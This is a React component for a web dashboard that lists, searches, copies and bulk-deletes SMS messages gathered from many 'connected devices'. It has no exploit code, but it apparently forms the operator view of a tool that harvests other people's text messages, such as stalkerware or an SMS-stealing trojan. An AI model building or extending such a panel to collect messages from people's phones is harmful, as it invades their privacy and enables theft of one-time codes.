"use client";
import React, { useState } from "react";

export default function SmsPanel({ data, deleteAllSms, showToast }) {
  const [filterDevice, setFilterDevice] = useState("ALL");
  const [searchQuery, setSearchQuery] = useState("");
  const [limit, setLimit] = useState(20);

  const smsData = data.user_sms || {};
  const devices = data.user_data || {};
  const deviceKeys = Object.keys(devices);

  let allMessages = [];

  Object.keys(smsData).forEach(devId => {
    if (filterDevice !== "ALL" && filterDevice !== devId) return;
    const msgs = smsData[devId];
    if (msgs) {
      Object.keys(msgs).forEach(k => {
        const item = msgs[k];
        if (item && typeof item === "object") {
          allMessages.push({
            id: k,
            deviceId: devId,
            ...item,
            sender: item.sender || item.address || item.from || "Unknown",
            body: item.body || item.message || item.text || "No Content",
            _timestamp: item.timestamp || item.date || 0,
            dateStr: item.date_formatted || (item.timestamp ? new Date(item.timestamp).toLocaleString() : item.date || "")
          });
        }
      });
    }
  });

  allMessages.sort((a, b) => b._timestamp - a._timestamp);

  if (searchQuery) {
    const q = searchQuery.toLowerCase();
    allMessages = allMessages.filter(m => 
      m.deviceId.toLowerCase().includes(q) ||
      m.sender.toLowerCase().includes(q) ||
      m.body.toLowerCase().includes(q)
    );
  }

  const displayList = allMessages.slice(0, limit);

  const copySms = (text) => {
    navigator.clipboard.writeText(text);
    showToast("📋 SMS Copied!", "success");
  };

  return (
    <div className="panel active">
      <div className="panel-header">
        <div>
          <h2><i className="fas fa-envelope" style={{ color: "var(--gold)" }}></i> SMS Catalog (All Messages)</h2>
          <p className="panel-sub">Live stream of incoming messages across all connected devices</p>
        </div>
        <div className="panel-stats">
          <span className="stat-item">
            <i className="fas fa-envelope"></i> Total: {allMessages.length}
          </span>
          <button className="btn-delete-all" onClick={deleteAllSms}>
            <i className="fas fa-trash-alt"></i> Delete All SMS
          </button>
        </div>
      </div>

      <div style={{ display: "grid", gridTemplateColumns: "1fr 1fr", gap: 10, marginBottom: 14 }}>
        <div>
          <select 
            className="luxury-select"
            value={filterDevice}
            onChange={(e) => { setFilterDevice(e.target.value); setLimit(20); }}
          >
            <option value="ALL">📱 All Devices ({deviceKeys.length})</option>
            {deviceKeys.map(id => (
              <option key={id} value={id}>
                📱 {id} ({Object.keys(smsData[id] || {}).length} SMS)
              </option>
            ))}
          </select>
        </div>

        <div className="search-container" style={{ margin: 0 }}>
          <i className="fas fa-search search-icon"></i>
          <input 
            type="text" 
            placeholder="Search sender, text, device..." 
            className="search-input"
            value={searchQuery}
            onChange={(e) => { setSearchQuery(e.target.value); setLimit(20); }}
          />
          {searchQuery && (
            <button className="search-clear-btn" style={{ display: "block" }} onClick={() => setSearchQuery("")}>
              <i className="fas fa-times"></i>
            </button>
          )}
        </div>
      </div>

      {filterDevice !== "ALL" && (
        <div style={{ marginBottom: 10, display: "flex", alignItems: "center", gap: 8 }}>
          <span style={{ fontSize: 12, color: "var(--gold-light)", fontWeight: 700 }}>
            Filtering Device: <strong>{filterDevice}</strong>
          </span>
          <button 
            className="btn-sm" 
            style={{ background: "#fee2e2", color: "var(--red)", border: "1px solid #fca5a5", padding: "2px 8px", borderRadius: 4, cursor: "pointer", fontWeight: 600 }}
            onClick={() => setFilterDevice("ALL")}
          >
            ✕ Reset Filter
          </button>
        </div>
      )}

      <div className="sms-list-luxury" style={{ maxHeight: 600, overflowY: "auto", display: "flex", flexDirection: "column", gap: 8 }}>
        {displayList.length === 0 ? (
          <div className="empty-luxury">
            <i className="fas fa-inbox empty-icon"></i>
            No SMS messages found.
          </div>
        ) : (
          displayList.map((msg, i) => (
            <div 
              key={msg.id || i} 
              className="sms-card-luxury" 
              style={{
                background: "#ffffff",
                border: "1px solid var(--border-color)",
                borderLeft: "4px solid var(--gold)",
                borderRadius: "var(--radius-sm)",
                padding: "12px",
                display: "flex",
                flexDirection: "column",
                gap: 6
              }}
            >
              <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center", flexWrap: "wrap", gap: 8, borderBottom: "1px solid var(--border-color)", paddingBottom: 6 }}>
                <div style={{ display: "flex", alignItems: "center", gap: 6, flexWrap: "wrap" }}>
                  <span 
                    style={{
                      background: "#f1f5f9",
                      padding: "2px 6px",
                      borderRadius: 4,
                      fontSize: 10,
                      fontWeight: 700,
                      cursor: "pointer"
                    }}
                    title="Click to filter this device only"
                    onClick={() => {
                      setFilterDevice(msg.deviceId);
                      showToast(`Filtered: ${msg.deviceId}`, "info");
                    }}
                  >
                    📱 [{msg.deviceId}]
                  </span>
                  <span style={{ fontWeight: 700, fontSize: 12, color: "var(--text-primary)" }}>👤 {msg.sender}</span>
                </div>
                <div style={{ display: "flex", alignItems: "center", gap: 8 }}>
                  <span style={{ fontSize: 10, color: "var(--text-muted)" }}>{msg.dateStr}</span>
                  <button 
                    onClick={() => copySms(msg.body)}
                    style={{ background: "transparent", border: "none", color: "var(--gold)", cursor: "pointer", fontSize: 11 }}
                    title="Copy SMS Body"
                  >
                    <i className="fas fa-copy"></i>
                  </button>
                </div>
              </div>
              <div style={{ fontSize: 12, color: "var(--text-primary)", lineHeight: 1.4, whiteSpace: "pre-wrap", wordBreak: "break-word" }}>
                {msg.body}
              </div>
            </div>
          ))
        )}
      </div>

      {limit < allMessages.length && (
        <button 
          className="btn-load-more" 
          onClick={() => setLimit(l => l + 20)}
          style={{ marginTop: 14 }}
        >
          <i className="fas fa-chevron-down"></i> Load More Messages ({allMessages.length - limit} remaining)
        </button>
      )}
    </div>
  );
}
